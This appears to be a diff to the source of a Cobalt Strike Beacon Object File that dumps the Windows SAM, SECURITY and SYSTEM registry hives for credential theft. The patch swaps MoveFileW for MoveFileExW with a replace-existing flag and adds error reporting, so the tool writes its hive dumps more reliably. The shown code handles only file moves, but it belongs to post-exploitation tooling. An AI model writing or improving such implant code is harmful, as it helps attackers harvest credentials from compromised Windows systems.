@@ -86,6 +86,7 @@ BOOL NTAPI __declspec(dllimport) KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWOR
 DWORD NTAPI __declspec(dllimport) KERNEL32$GetFileSize(HANDLE, LPDWORD);
 BOOL NTAPI __declspec(dllimport) KERNEL32$DeleteFileW(LPCWSTR);
 BOOL NTAPI __declspec(dllimport) KERNEL32$MoveFileW(LPCWSTR, LPCWSTR);
+BOOL NTAPI __declspec(dllimport) KERNEL32$MoveFileExW(LPCWSTR, LPCWSTR, DWORD);
 BOOL NTAPI __declspec(dllimport) KERNEL32$CopyFileW(LPCWSTR, LPCWSTR, BOOL);
 UINT NTAPI __declspec(dllimport) KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
 BOOL NTAPI __declspec(dllimport) KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
@@ -705,8 +706,9 @@ void go(char * args, int alen)
                     BeaconPrintf(0, "  [+] packed %s\n", samPath);
             } else if (keepTemp) {
                 KERNEL32$CopyFileW(samTmpW, samOutW, FALSE);
-            } else {
-                KERNEL32$MoveFileW(samTmpW, samOutW);
+            } else if (!KERNEL32$MoveFileExW(samTmpW, samOutW, MOVEFILE_REPLACE_EXISTING)) {
+                BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
+                samOk = FALSE;
             }
         }
         if (secOk) {
@@ -715,8 +717,9 @@ void go(char * args, int alen)
                     BeaconPrintf(0, "  [+] packed %s\n", secPath);
             } else if (keepTemp) {
                 KERNEL32$CopyFileW(secTmpW, secOutW, FALSE);
-            } else {
-                KERNEL32$MoveFileW(secTmpW, secOutW);
+            } else if (!KERNEL32$MoveFileExW(secTmpW, secOutW, MOVEFILE_REPLACE_EXISTING)) {
+                BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
+                secOk = FALSE;
             }
         }
     }
@@ -740,8 +743,9 @@ void go(char * args, int alen)
                     BeaconPrintf(0, "  [+] packed %s\n", sysPath);
             } else if (keepTemp) {
                 KERNEL32$CopyFileW(sysTmpW, sysOutW, FALSE);
-            } else {
-                KERNEL32$MoveFileW(sysTmpW, sysOutW);
+            } else if (!KERNEL32$MoveFileExW(sysTmpW, sysOutW, MOVEFILE_REPLACE_EXISTING)) {
+                BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
+                sysOk = FALSE;
             }
         }
     }
